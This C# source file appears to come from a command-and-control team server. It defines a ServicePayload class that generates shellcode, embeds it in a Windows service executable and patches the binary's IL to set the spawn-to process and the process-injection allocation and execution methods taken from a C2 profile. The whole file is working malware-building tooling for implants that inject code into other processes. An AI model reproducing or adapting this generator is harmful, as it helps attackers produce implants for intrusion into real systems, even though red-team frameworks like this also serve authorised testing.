using System.ComponentModel.DataAnnotations;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

using dnlib.DotNet;
using dnlib.DotNet.Emit;

using TeamServer.Handlers;

namespace TeamServer.Models
{
    public class ServicePayload : Payload
    {
        public ServicePayload(Handler handler, C2Profile c2Profile) : base(handler, c2Profile) { }
        
        public override async Task Generate()
        {
            var shellcode = new RawPayload(Handler, C2Profile);
            await shellcode.Generate();

            var svcBinary = await Utilities.GetEmbeddedResource("drone_svc.exe");
            
            var module = ModuleDefMD.Load(svcBinary);
            module.Resources.Add(new EmbeddedResource("drone", shellcode.Bytes));

            SetSpawnTo(module);
            SetAllocation(module);
            SetExecution(module);
            
            await using var ms = new MemoryStream();
            module.Write(ms);
            Bytes = ms.ToArray();
        }

        private void SetSpawnTo(ModuleDef module)
        {
            var service = module.Types.GetType("Service");
            var method = service.Methods.GetMethod("SpawnTo");
            
            var instruction = method.Body.Instructions.First(i => i.OpCode == OpCodes.Ldstr);
            instruction.Operand = C2Profile.PostExploitation.SpawnTo;
        }

        private void SetAllocation(ModuleDef module)
        {
            var alloc = module.Types.GetType(C2Profile.ProcessInjection.Allocation);
            
            var service = module.Types.GetType("Service");
            var method = service.Methods.GetMethod("Allocation");
            method.Body.Instructions[0].Operand = alloc;
        }

        private void SetExecution(ModuleDef module)
        {
            var exec = module.Types.GetType(C2Profile.ProcessInjection.Execution);
            
            var service = module.Types.GetType("Service");
            var method = service.Methods.GetMethod("Execution");
            method.Body.Instructions[0].Operand = exec;
        }
    }
}